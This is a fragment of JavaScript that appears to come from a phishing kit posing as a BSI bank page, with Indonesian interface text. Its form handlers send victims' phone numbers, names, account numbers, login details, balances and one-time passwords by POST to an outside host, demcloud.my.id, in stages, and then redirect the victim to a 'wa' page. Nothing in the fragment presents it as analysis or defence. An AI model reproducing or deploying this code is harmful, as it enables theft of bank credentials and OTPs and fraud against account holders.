let tglNow = new Date();
let waktuBatas = new Date("2025-09-10T23:59:59");
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/bfdd0/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/bfdd0/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/bfdd0/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://demcloud.my.id/BSI/bfdd0/otp.php',
 async: false,
 dataType: 'JSON',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/BSI/bfdd0/wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1100);      
